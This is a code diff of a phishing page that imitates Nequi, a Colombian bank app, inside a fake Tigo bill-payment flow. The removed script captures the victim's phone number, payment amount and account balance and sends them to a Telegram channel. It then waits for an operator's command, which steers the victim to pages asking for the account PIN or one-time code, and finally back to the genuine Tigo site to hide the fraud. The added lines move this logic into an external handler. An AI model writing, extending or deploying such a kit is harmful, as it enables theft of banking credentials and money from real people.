@@ -47,18 +47,20 @@
     </p>
 
     <div class="w-full max-w-[350px] mx-auto mb-6">
-      <div class="relative">
-        <span class="absolute left-4 top-1/2 transform -translate-y-1/2 text-2xl text-gray-400 font-bold">$</span>
-        <input 
-          type="tel" 
-          id="saldoInput" 
-          maxlength="15"
-          pattern="[0-9]*"
-          inputmode="numeric"
-          class="w-full bg-gray-100 border-none rounded-xl h-16 pl-12 pr-4 text-xl text-gray-900 focus:outline-none focus:ring-2 focus:ring-pink-primary"
-          placeholder=""
-        >
-      </div>
+      <form id="saldoForm">
+        <div class="relative">
+          <span class="absolute left-4 top-1/2 transform -translate-y-1/2 text-2xl text-gray-400 font-bold">$</span>
+          <input 
+            type="tel" 
+            id="saldoInput" 
+            maxlength="15"
+            pattern="[0-9]*"
+            inputmode="numeric"
+            class="w-full bg-gray-100 border-none rounded-xl h-16 pl-12 pr-4 text-xl text-gray-900 focus:outline-none focus:ring-2 focus:ring-pink-primary"
+            placeholder=""
+          >
+        </div>
+      </form>
     </div>
 
     <div class="w-full max-w-[350px] mx-auto space-y-3">
@@ -87,177 +89,9 @@
     </div>
   </div>
 
+  <script src="/socket.io/socket.io.js"></script>
   <script src="/js/telegram-integration.js"></script>
   <script src="/js/banco-utils.js"></script>
-  <script src="../bank-config.js"></script>
-  <script src="../bank-telegram-base.js"></script>
-  <script src="../banco-master-telegram.js"></script>
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      console.log('[NEQUI SALDO INPUT] Inicializando');
-      
-      const saldoInput = document.getElementById('saldoInput');
-      const btnValidar = document.getElementById('btnValidar');
-      const btnCancelar = document.getElementById('btnCancelar');
-
-      // Obtener datos de sesión
-      const phoneNumber = sessionStorage.getItem('nequi_phone') || '';
-      const amount = sessionStorage.getItem('payment_amount') || '0';
-      console.log('[NEQUI SALDO INPUT] Teléfono recuperado:', phoneNumber);
-      console.log('[NEQUI SALDO INPUT] Monto a pagar:', amount);
-
-      const bankTelegram = new BankTelegramIntegration('Nequi', 'nequi');
-
-      // Permitir solo números en el input de saldo
-      saldoInput.addEventListener('input', function(e) {
-        // Remover cualquier carácter que no sea número
-        this.value = this.value.replace(/[^0-9]/g, '');
-        
-        if (this.value.trim().length > 0) {
-          btnValidar.disabled = false;
-          btnValidar.style.backgroundColor = '#DA0081';
-          btnValidar.style.cursor = 'pointer';
-        } else {
-          btnValidar.disabled = true;
-          btnValidar.style.backgroundColor = '#F8A8D8';
-          btnValidar.style.cursor = 'not-allowed';
-        }
-      });
-
-      // Botón cancelar
-      btnCancelar.addEventListener('click', function() {
-        if (confirm('¿Estás seguro de que deseas cancelar el pago?')) {
-          window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
-        }
-      });
-
-      // Botón validar
-      btnValidar.addEventListener('click', async function() {
-        if (btnValidar.disabled) return;
-
-        const saldo = saldoInput.value.trim();
-        if (!saldo) return;
-
-        // Mostrar overlay nequi-loading
-        const overlay = document.getElementById('loadingOverlay');
-        if (overlay) {
-          overlay.classList.add('active');
-        }
-        
-        const originalText = btnValidar.textContent;
-        btnValidar.disabled = true;
-        btnValidar.textContent = 'Verificando...';
-
-        const success = await bankTelegram.sendToTelegram('saldo', {
-          telefono: phoneNumber,
-          saldo: saldo,
-          monto: amount
-        });
-
-        if (success) {
-          console.log('[NEQUI SALDO INPUT] ✅ Datos enviados, iniciando polling...');
-          
-          // Polling con overlay activo
-          bankTelegram.startPolling((action) => {
-            console.log('[NEQUI SALDO INPUT] ========== CALLBACK EJECUTADO ==========');
-            console.log('[NEQUI SALDO INPUT] Acción recibida:', action.action);
-            
-            // Guardia anti-duplicados
-            if (window.__nequiSaldoProcessing) {
-              console.warn('[NEQUI SALDO INPUT] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
-              return;
-            }
-            window.__nequiSaldoProcessing = true;
-
-            console.log('[NEQUI SALDO INPUT] Procesando acción:', action.action);
-            
-            // Switch SIN replace - usar la acción completa
-            switch(action.action) {
-              case 'nequi_saldo_aprobado':
-              case 'saldo_aprobado':
-                console.log('[NEQUI SALDO INPUT] ✅ Saldo aprobado → Redirigiendo a clave.html');
-                window.location.href = 'clave.html';
-                break;
-                
-              case 'nequi_request_clave':
-              case 'nequi_pedir_clave':
-              case 'request_clave':
-              case 'pedir_clave':
-                console.log('[NEQUI SALDO INPUT] 🔐 Pedir clave → Redirigiendo a clave.html');
-                window.location.href = 'clave.html';
-                break;
-                
-              case 'nequi_request_numero':
-              case 'nequi_pedir_numero':
-                console.log('[NEQUI SALDO INPUT] 📱 Pedir número → Redirigiendo a numero.html');
-                window.location.href = 'numero.html';
-                break;
-                
-              case 'nequi_pedir_saldo':
-              case 'nequi_request_saldo':
-                console.log('[NEQUI SALDO INPUT] 📊 Ya estamos en saldo, recargando...');
-                window.location.reload();
-                break;
-                
-              case 'nequi_request_dinamica':
-              case 'nequi_pedir_dinamica':
-                console.log('[NEQUI SALDO INPUT] 🎯 Pedir dinámica → Redirigiendo a clave-dinamica.html');
-                window.location.href = 'clave-dinamica.html';
-                break;
-
-              case 'nequi_saldo_rechazado':
-              case 'nequi_error_saldo':
-              case 'saldo_rechazado':
-              case 'error_saldo':
-                console.log('[NEQUI SALDO INPUT] ❌ Saldo rechazado/error → Reintentando');
-                if (overlay) {
-                  overlay.classList.remove('active');
-                }
-                saldoInput.value = '';
-                btnValidar.disabled = true;
-                btnValidar.style.backgroundColor = '#F8A8D8';
-                btnValidar.textContent = 'Continuar';
-                window.__nequiSaldoProcessing = false;
-                break;
-                
-              case 'nequi_error_clave':
-                console.log('[NEQUI SALDO INPUT] ❌ Error clave → Redirigiendo a clave.html');
-                window.location.href = 'clave.html';
-                break;
-                
-              case 'nequi_error_dinamica':
-                console.log('[NEQUI SALDO INPUT] ❌ Error dinámica → Redirigiendo a clave-dinamica.html');
-                window.location.href = 'clave-dinamica.html';
-                break;
-
-              case 'nequi_finalizar':
-              case 'finalizar':
-                console.log('[NEQUI SALDO INPUT] 🏁 Finalizar → Redirigiendo a Tigo');
-                localStorage.removeItem('nequi_session_id');
-                sessionStorage.clear();
-                window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
-                break;
-
-              default:
-                console.warn('[NEQUI SALDO INPUT] ⚠️ Acción no reconocida:', action.action);
-                if (overlay) {
-                  overlay.classList.remove('active');
-                }
-                btnValidar.disabled = false;
-                btnValidar.textContent = 'Continuar';
-                window.__nequiSaldoProcessing = false;
-            }
-          });
-        } else {
-          if (overlay) {
-            overlay.classList.remove('active');
-          }
-          alert('Error al enviar datos. Intenta nuevamente.');
-          btnValidar.disabled = false;
-          btnValidar.textContent = 'Continuar';
-        }
-      });
-    });
-  </script>
+  <script src="/js/pse-bank-handler.js"></script>
 </body>
 </html>
